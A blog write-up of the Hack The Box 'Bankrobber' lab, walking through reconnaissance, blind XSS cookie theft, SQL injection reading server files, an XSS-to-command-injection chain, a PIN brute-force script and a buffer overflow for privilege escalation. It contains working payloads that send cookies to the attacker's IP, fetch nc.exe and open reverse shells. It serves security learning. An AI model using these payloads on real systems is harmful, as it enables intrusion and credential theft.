---
layout: post
title:  "Bankrobber Writeup - Hack The Box"
date:   2025-07-20
desc: ""
keywords: "HTB,OSCP,eWPT,eWPTXv2,OSWE,Windows,Blind XSS Injection,Stealing Session Cookie,SQLi,Binary Abusing,Insane"
categories: [HTB]
tags: [HTB,OSCP,eWPT,eWPTXv2,OSWE,Windows,Blind XSS Injection,Stealing Session Cookie,SQLi,Binary Abusing,Insane]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

My adventure continues with another very nice **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, in which exploiting a very well known vulnerability in the **Information Security** field was a lot of fun and then understanding how it could be used to engage the lab was so rewarding. The machine is catalogued as **Insane**, and the truth is that it took me a great investment of time, research, lateral thinking, trial and error, frustration, **typical feelings of this beautiful field**. I login to my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account, spaw the box and I can start my writeup.

<br /><br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I must start with the **Reconnaissance** phase, but for this I will check with `ping` that I can already access the lab by sending a trace and that it receives correctly on the target. With the `whichSystem.py` tool, created by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, I can validate that the **OS** of the machine is **Windows**. Now I can get the open ports with `nmap`, first using the **TCP** protocol (later I can use **UDP**, if necessary) and also with the scripts of this excellent tool I leak information of the services and their versions, which I will investigate to find attack vectors that allow me to access the system. I find very varied data that I will be pointing to keep in mind later, the Web service is the one that always represents a large attack surface, because usually a user can and must interact with it, with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I disclose the stack of technologies behind the application, there are many involved so it **may be fruitful** to continue investigating the web.

```bash
ping -c 2 10.10.10.154
whichSystem.py 10.10.10.154
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.154 -oG allPorts
nmap -sCV -p80,443,445,3306 10.10.10.154 -oN targeted
cat targeted
# Microsoft Windows 7 - 10
# 3306/tcp open  mysql        MariaDB 10.3.23

whatweb http://10.10.10.154
# http://10.10.10.154/
# https://10.10.10.154/
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The web application allows me to register, so for the moment it is not necessary to perform attacks to bypass the form, but before continuing with the webpage (which seem to be the same, both for the secure protocol **HTTPS** and the insecure one, **HTTP**) I will enumerate with `openssl` in search of more information, such as subdomains, but I have no luck. With `crackmapexec` I leak more **OS** information, plus I know now that the **SMB** protocol is **not signed**, so it may be susceptible to an **[SMB Relay Attack](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**. I can't connect with the `smbclient` and `smbmap` tools because I don't have valid credentials, so I'm going to resume my research on port **80** and **443**. In the source code I find the names of the **.php** files, in charge of authentication and user registration. Once I create an account, the first thing I notice and that seems to be the main functionality of the application, is the transfer of **E-coin** (the **transfer.php** file seems to be in charge of this task).

> **[SMB Relay Attack](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker impersonates the user to gain unauthorized access.

```bash
openssl s_client --connect 10.10.10.154:443
crackmapexec smb 10.10.10.154
# Windows 10 Pro - signing:False - SMBv1:True

smbclient -L 10.10.10.154 -N
smbmap -H 10.10.10.154 -u 'null'

# https://10.10.10.154/
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With a transfer test I can check that it is very likely that an automatic task has been configured on the server to handle this functionality. With a small **[XSS](https://portswigger.net/web-security/cross-site-scripting){:target="_blank"}** injection I manage to get a request to a local server started with `python` on my machine, so I can try to **[steal a cookie](https://deephacking.tech/exploiting-cross-site-scripting-to-steal-cookies-portswigger-write-up/){:target="_blank"}** via **[XSS](https://portswigger.net/web-security/cross-site-scripting){:target="_blank"}**. I will use **BurpSuite** to capture the request and investigate a little bit what data is sent to the web server, then I will create a **[.js file](https://javascript.info/xmlhttprequest){:target="_blank"}** with the necessary code to attempt the steal and with `python` I start again the local server so that my malicious file is accessible from the victim machine. In the **Proxy** tab of **BurpSuite** I can see that the authentication related data travels in **Base64** encoding. The first time I fail to get the cookie, but after correcting my **.js script** (problems with the use of single quotes) I achieve my goal.

> **[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting){:target="_blank"}** (also known as **XSS**) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to **circumvent** the same origin policy, which is designed to segregate different websites from each other. **Cross-site scripting vulnerabilities** normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

```bash
# https://10.10.10.154/user/
# Transfer on hold. An admin will review it within a minute.    :)

python3 -m http.server 80
# https://10.10.10.154/user/
# <script src="http://10.10.14.2/oldboy"></script>

burpsuite &>/dev/null & disown

nvim pwn3d.js
cat !$
python3 -m http.server 80
# https://10.10.10.154/user/
# Transfer E-coin
# BurpSuite --> Cookie: id=3; username=b2xkYm95; password=b2xkYm95MTIz
# :(

nvim pwn3d.js
cat !$
```

> **pwn3d.js**:

```js
var req = new XMLHttpRequest();
req.open("GET",'http://10.10.14.10/?cookie=' + document.cookie, true);
req.send();
```

```bash
# 10.10.10.154 - - [03/Jul/2025 17:12:49] "GET /?cookie=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

From the request captured with **BurpSuite**, I had observed that the data related to the authentication (**username** and **password**) travels encoded in **Base64**, from my console I just confirm it using `base64`, so I can extract from the stolen session cookie the credentials of the **admin** user and access his web administration panel. Now I find more resources available, in one of them it leaks information from the implemented web server (**XAMPP**) and data related to the comments, which must be filtered depending on the **IP**.
 
```bash
echo "b2xkYm95" | base64 -d; echo
echo "b2xkYm95MTIz" | base64 -d; echo

echo "YWRtaW4=" | base64 -d; echo
# admin
echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d; echo

# https://10.10.10.154/admin/
# https://10.10.10.154/notes.txt
# ... default Xampp folder ...
# ... Encode comments ... ?
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The application has **two new features** available for **admin** user, one of them allows me to perform queries on the existing web application users (most probably) and the other one that would allow me to execute the `dir` command is only accessible from the localhost (**::1**). My instinct dictates me to try a **SQLi** on the query sent in the **Search users (beta)**, and from the message I get I find that the server seems to be vulnerable to this type of attack. I adjust my injection and manage to leak information from the database - **DB name**, **user**, etc. I get the list of all the Databases, but when I try to execute command by injecting **PHP** code directly into the query I don't achieve my goal.

```bash
# https://10.10.10.154/admin/
#  1' and sleep(5)-- -
#  1' or sleep(5)-- -                                                                                        :)
#  1' or 1=1-- -
#  1' order by 4-- -
#  1' order by 3-- -                                                                                         :)
#  1' union select 1,2,3-- -
#  1' union select 1,database(),3-- -
#  1' union select 1,user(),3-- -
#  1' union select 1,version(),3-- -
#  1' union select 1,"<?php system('whoami'); ?>",3-- -

tcpdump -i tun0 icmp -n
#  1' union select 1,"<?php system('ping -n 10.10.14.10'); ?>",3-- -                                         :(
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will continue to leak information from the **bankrobber** Database, such as tables and columns. The only thing I find is the **admin** user password, which I already had, so I look for more credentials in other Databases and find the hash of the **root** password (but I can't crack it with `john` because it must use a very strong cryptographic hash function).

```bash
# https://10.10.10.154/admin/
#  1' union select 1,schema_name,3 from information_schema.schemata-- -
#  1' union select 1,table_name,3 from information_schema.tables where table_schema='bankrobber'-- -
#  1' union select 1,column_name,3 from information_schema.columns where table_schema='bankrobber' and table_name='users'-- -
#  1' union select 1,group_concat(username,0x3a,password),3 from users-- -
#  1' union select 1,group_concat(User,0x3a,Password),3 from mysql.user-- -

john -w=$(locate rockyou.txt)
john -w=/usr/share/wordlists/rockyou.txt root_hash
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My next step is to search for sensitive information of the system and the default installation **[path of XAMPP](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html){:target="_blank"}** thanks to the **SQL** *load_file* function, I can access the content of files to which any system user has permissions to do so, I can also see the content of the first flag to enter in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, but the most interesting are the **.php** files of the web application including the source code of the **backdoorchecker.php** file (related to the second functionality that I could not use). The most important thing I could collect from my analysis of the file, is that there is a **badchar** definition, I can only execute `dir` from **localhost**, and the authentication credentials are harcoded (very bad practice).

```bash
# https://10.10.10.154/admin/
#  1' union select 1,load_file("C:\\Windows\\System32\\drivers\\etc\\hosts"),3-- -
#  1' union select 1,load_file("c:\\xampp\\apache\\bin\\php.ini"),3-- -
#  1' union select 1,load_file("c:\\xampp\\htdocs\\index.php"),3-- -
#  1' union select 1,load_file("C:\\Users\\Cortin\\Desktop\\user.txt"),3-- -   :)
#  1' union select 1,load_file("c:\\xampp\\htdocs\\admin\\backdoorchecker.php"),3-- -

# Analyze Code!
# $bad 	  = array('$(','&');
# if(strtolower(substr(PHP_OS,0,3)) == "win"){
#	$good = "dir";
# if($username == "admin" && $password == "Hopelessromantic"){
#	if(isset($_POST['cmd'])){
#			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
#			if($_SERVER['REMOTE_ADDR'] == "::1"){
#				system($_POST['cmd']);
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I believe that the attack vector may be the combination of the two vulnerabilities, **XSS** and **[CSRF](https://portswigger.net/web-security/csrf){:target="_blank"}**, to obtain a **RCE** and thus gain access to the system. What I'm going to do first is to capture the request with **BurpSuite** when trying to execute `dir` to investigate what data is required by the server. The next step is to **[create a .js file to send a request to the backdoorchecker.php](https://javascript.info/xmlhttprequest){:target="_blank"}** file to get the `dir` command executed but concatenating another one with ```|```. There should be no problems since the request will come from the **localhost** IP (thanks to the **XSS**), but in my first attempt I don't succeed. Although I receive the request from the malicious file to my local server started with `python`, the command is not executed, even when I use the **admin** user credentials in the malicious request.

> **[Cross-site request forgery](https://portswigger.net/web-security/csrf){:target="_blank"}** (also known as **CSRF**) is a web security vulnerability that allows an attacker to induce users to perform actions that they do **not intend to perform**. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

```bash
burpsuite &>/dev/null & disown
# https://10.10.10.154/admin/
# Host, Cookie, Content-Type, cmd=dir (Remember this values)

nvim pwn3d_rce.js
cat !$
```

> **pwn3d_rce.js**:

```js
var xhr = new XMLHttpRequest();
param = 'cmd=dir|powershell -c "ping -n 3 10.10.14.10"';
xhr.open("POST",'http://localhost/admin/backdoorchecker.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(param);
```

```bash
python3 -m http.server 80
tcpdump -i tun0 icmp -n
# http://10.10.10.154/user/
# <script src="http://10.10.14.10/pwn3d_rce.js"></script>

# BurpSuite
# Cookie: id=1; username=YWRtaW4%3d; password=SG9wZWxlc3Nyb21hbnRpYw%3d%3d          ? :(
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After a while of trial and error I find the problem in my malicious script, for the creation of the **Request** I have to change the declaration of the variable (use **var** and not **let**), also I use again the credentials of the account I created and not the **admin** ones, this way I could execute the command remotely. To access the system I only need `nc.exe`, start a local **SMB** server with `impacket-smbserver` so that `nc.exe` is accessible, update my malicious **.js** file with the command in which `nc.exe` is responsible for sending me a **Reverse Shell**, with `nc` I open port **443** to catch the incoming communication and finally perform the **XSS** to engage the machine. Already in the system I perform some enumeration commands and I can also see the content of the first flag.

> **Attacker Machine**:

```bash
nvim pwn3d_rce.js
# let <--> var
python3 -m http.server 80
tcpdump -i tun0 icmp -n

nvim pwn3d_rce.js
cat !$
```

> **pwn3d_rce.js**:

```js
var xhr = new XMLHttpRequest();
param = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.10/nc.exe -OutFile %tmp%\\nc.exe"; %tmp%\\nc.exe -e cmd 10.10.14.10 443';
xhr.open("POST",'http://localhost/admin/backdoorchecker.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(param);
```

```bash
locate nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
whoami
hostname
whoami /priv
whoami /all
dir /s user.txt
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I do not have privileges that allow me to perform tasks, extract information from the system, or other malicious activities, and before automating the search for attack vectors with tools available on the **Internet** that allow me to **Escalate Privileges** I'm going to browse the file system a bit. In the root directory there is a suspicious binary (`bankv2.exe`), I also find with `netstat` locally open ports (**135**, **910**) and with `tasklist` I check that everything I found before is linked. There is a process `bankv2.exe` running and it is accessible on port **910**, this deduction I make is thanks to the value of the **PID** of the process. I use `nc.exe`, automatically saved by the system in the **Temp** folder, to use it and it tries to connect to the local port **910**, in which I am asked for a **PIN** code, which I don't have at the moment.

```cmd
cd C:\
# bankv2.exe

netstat -ano
# TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       744
# TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1648     (PID: 1648)
netstat -nat
tasklist
# bankv2.exe                    1648                            0        132 K

echo %tmp%
C:\Users\Cortin\AppData\Local\Temp\nc.exe 127.0.0.1 910
# 1234          :(
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to use **[chisel](https://github.com/jpillora/chisel){:target="_blank"}** to create a tunnel to port **910** of the victim machine, for this I will first compile the binary after downloading the project from **Github** on my machine, I also compress it with `upx` to save space. With `systemInfo` I get the architecture of the machine and so I transfer the correct `chisel.exe` version, but also I will use an old version of it to avoid compatibility errors. After trying several methods to transfer files from a **Linux** OS machine to a **Windows** machine, I finally succeed and I can now access the **bankv2.exe** application from my local port **910**.

> **Attacker Machine**:

```bash
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags '-s -w' .
du -hc chisel
upx chisel &>/dev/null
du -hc chisel
```

> **Victime Machine**:

```cmd
systemInfo
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/chisel_1.7.5_windows_amd64.gz chisel.exe.gz
gunzip chisel.exe.gz
file chisel.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/chisel.exe')"
# :(
```

> **Attacker Machine**:

```bash
md5sum chisel.exe
```

> **Victime Machine**:

```cmd
cmd /c powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/chisel.exe')"
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.10\smbFolder\chisel.exe .\chisel.exe

powershell -c iwr -uri http://10.10.14.10/chisel.exe -OutFile .\chisel.exe
# :)
powershell -c certutil -hashfile .\chisel.exe MD5
```

> **Attacker Machine**:

```bash
chmod +x chisel
./chisel
./chisel server --reverse -p 1234
```

> **Victime Machine**:

```cmd
.\chisel.exe
.\chisel.exe client 10.10.14.10:1234 R:910:127.0.0.1:910
```

> **Attacker Machine**:

```bash
lsof -i:910
nc localhost 910
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can start testing how the application works, with `crunch` I can generate a custom dictionary with values for the **PIN code** and create an exploit written in **Python** to perform a brute force attack and bypass the access restriction. After solving a problem in the installation of the **pwn** library, since I had to configure an environment for **Python** I manage to run the script and get the correct **PIN**. The task of the application is the transfer of **e-coins**, but the most interesting thing is that it leaks the absolute path of the binary used by the application.

```bash
nc localhost 910
crunch 4 4 -t %%%% | head -n 10
crunch 4 4 -t %%%% > pins

cat pins | wc -l
nvim brute_force.py
python3 brute_force.py
pip3 install pwn

python3 -m venv .
./bin/pip3 install pwn
./bin/python3 brute_force.py 2>/dev/null
cat brute_force.py
```

> **brute_force.py**:

```python
#!/usr/bin/python3

import pdb
from pwn import *

def ctrl_c(sig,frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, ctrl_c)

def bruteForceAttack():

    f = open("pins", "r")
    p1 = log.progress("Brute Force Attack")
    time.sleep(2)

    for pin in f.readlines():
        
        p1.status(b"Testing PIN: " + pin.strip("\n").encode())
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 910))
        
        data = s.recv(4096)

        s.send(pin.encode())

        data = s.recv(1024)
        if b"Access denied, disconnecting client...." not in data:

            p1.success(b"The PIN is " + pin.strip('\b').encode())
            sys.exit(0)


if __name__ == '__main__':

    bruteForceAttack()
```

```bash
./bin/python3 brute_force.py 2>/dev/null
# :)
nc localhost 910
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After some tests with the application, I can verify that it is vulnerable to a **BoF**, since I manage to crash it when I enter a long enough string in the field of the amount of **e-coins** to transfer (I must be careful with the attack because I had to **restart the machine** in my first attack). My goal is to inject a string specially designed to execute a command that will send me a **Reverse Shell**, so I have to make it so that instead of using the **transfer.exe** binary it executes my malicious command. To do this I will first use `pattern_create.rb` to generate a random string (not too long, **100 is enough**) to exploit the **BoF** again and then with `pattern_offset.rb` I can have the exact value of the number of characters before my malicious command. With `python` I do first a test and as everything seems correct, I can already perform the **BoF attack** and **Escalate privileges**. I access the content of the last flag, finished machine.

> **Attacker Machine**:

```bash
python3 -c 'print("A" * 300)'
nc localhost 910
  AAAA...AAA                        # :( I'm crash the service! 

# Reset the box :(

nc localhost 910
  AAAA....AA

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
nc localhost 910
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0Ab1
# [*] Exact match at offset 32

python3 -c 'print("A" * 32 + "B" * 8)'
nc localhost 910
  AAA...B     # :)

python3 -c 'print("A" * 32 + "C:\\Users\\Cortin\\AppData\\Local\\Temp\\nc.exe -e cmd 10.10.14.10 443")'
rlwrap -cAr nc -nlvp 443
nc localhost 910
  AAAA...443
```

> **Victime Machine**:

```cmd
whoami
hostname
```

<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a really demanding machine for me, because starting to relate different vulnerabilities and methods of exploiting them, is a big deficit that I'm still working on. The last phase of the lab **Engagement**, I was not really clear, but thanks to the support of the community I was able to find the attack vector and how to exploit it. I never tire of repeating that **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** is my **favorite platform** to learn and keep growing in this challenging field. I'm going to kill the box because I already want to start a new lab.

<br /><br />
<img src="{{ site.img_path }}/bankrobber_writeup/Bankrobber_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
